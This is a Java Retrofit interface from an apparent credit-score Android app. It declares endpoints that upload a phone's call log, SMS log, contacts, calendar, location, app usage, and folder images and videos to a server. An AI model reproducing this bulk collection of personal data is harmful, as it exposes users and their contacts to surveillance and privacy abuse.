package com.rosemallow.money3creditscore.Retrofitupload;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.rosemallow.money3creditscore.Apimodels.Locationdata;
import com.rosemallow.money3creditscore.Apimodels.mobilenumberdata;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Headers;
import retrofit2.http.POST;

public interface IRetrofit {
    @Headers({
            "Accept: application/json",
            "Content-Type: application/json"
    })
    @POST("mobilenumber")
    Call<mobilenumberdata> postRawJSON(@Body JsonObject locationPost);
    @POST("location")
    Call<Locationdata> postlocaion(@Body JsonObject locationPost);
    @POST("hw_sw")
    Call<JsonArray> posthardwaresoftware(@Body JsonArray locationPost);
    @POST("call_log")
    Call<JsonArray> postcalllog(@Body JsonArray locationPost);
    @POST("smslog")
    Call<JsonArray> postsmslog(@Body JsonArray locationPost);
    @POST("calender")
    Call<JsonArray> postcalendar(@Body JsonArray locationPost);
    @POST("userapps")
    Call<JsonArray> postuserappdata(@Body JsonArray locationPost);
    @POST("phoneapps")
    Call<JsonArray> postphoneappdata(@Body JsonArray locationPost);
    @POST("appusage")
    Call<JsonArray> postappusagedata(@Body JsonArray locationPost);
    @POST("contacts")
    Call<JsonArray> postcontactdata(@Body JsonArray locationPost);
    @POST("folderimages")
    Call<JsonArray> postimagedata(@Body JsonArray locationPost);
    @POST("foldervideos")
    Call<JsonArray> postvideodata(@Body JsonArray locationPost);


}


